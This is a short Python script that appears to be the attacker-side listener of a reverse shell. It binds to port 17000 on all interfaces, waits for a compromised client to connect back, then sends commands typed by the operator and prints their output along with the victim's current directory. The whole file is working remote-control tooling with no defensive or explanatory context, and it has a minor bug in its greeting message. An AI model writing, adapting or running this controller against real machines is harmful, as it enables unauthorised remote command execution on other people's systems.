import socket
from colorama import init,Fore

G = Fore.GREEN
R = Fore.RESET

sep = "<sep>"
s_host = "0.0.0.0"
s_port = 17000
bf_sz = 1024*256
s = socket.socket()
s.bind((s_host,s_port))
s.listen(3)
print(f"Listening on {s_host}:{s_port}...")
c_socket,c_address = s.accept()
print(f"Connected {c_address[0]} at {c_address[1]} port!")
cwd = c_socket.recv(bf_sz).decode()
print("Current working directory:", cwd)
while True:
	command = input(f"{G}{cwd}$>{R}")
	if not command.strip():
		print("{G}Bye, Master!")
		continue
	c_socket.send(command.encode())
	if command.lower() == "exit":
		break
	output = c_socket.recv(bf_sz).decode()
	res,cwd = output.split(sep)
	print(res)
